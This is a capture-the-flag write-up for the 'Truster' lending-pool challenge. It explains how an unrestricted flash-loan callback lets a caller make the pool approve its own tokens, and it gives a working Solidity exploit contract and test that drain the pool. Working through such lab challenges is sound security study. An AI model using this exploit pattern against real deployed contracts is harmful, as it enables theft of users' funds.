# Truster

## Challenge Overview

**Truster** features a lending pool offering flashloans of DVT tokens for free. The pool holds 1 million DVT. The player starts with nothing.

The objective is to rescue all of the funds in the lending pool in a single transaction by moving the funds to a designated recovery account.

## Protocol Summary

The `TrusterLenderPool` contract offers a `flashLoan` with an external callback to an arbitrary `target` address.

## Vulnerability Analysis

The callback executed by `flashLoan` is unrestricted and originates from `TrusterLenderPool`. This allows an attacker to force the pool to approve its own DVT balance to an attacker-controlled address, enabling the full pool balance to be drained via `transferFrom`.

## Exploit Strategy

The exploit is executed by calling `flashLoan` with the DVT token as the external call `target` and supplying calldata that makes the pool execute `approve`.

`TrusterRecoverer` is used to execute the exploit and forward the drained funds to the recovery address.

```solidity
contract TrusterRecoverer {
    function recover(TrusterLenderPool pool, DamnValuableToken token, address recovery, uint256 amount) external {
        bytes memory callData = abi.encodeWithSelector(
            pool.flashLoan.selector,
            0,
            recovery,
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                amount
            )
        );

        address(pool).call(callData);
        token.transferFrom(address(pool), recovery, amount);
    }
}
```

## Proof of Concept

```solidity
function test_truster() public checkSolvedByPlayer {
    TrusterRecoverer recoverer = new TrusterRecoverer();
    recoverer.recover(pool, token, recovery, TOKENS_IN_POOL);
}
```

## Result

The pool's DVT will be transfered out into the `recovery` address.
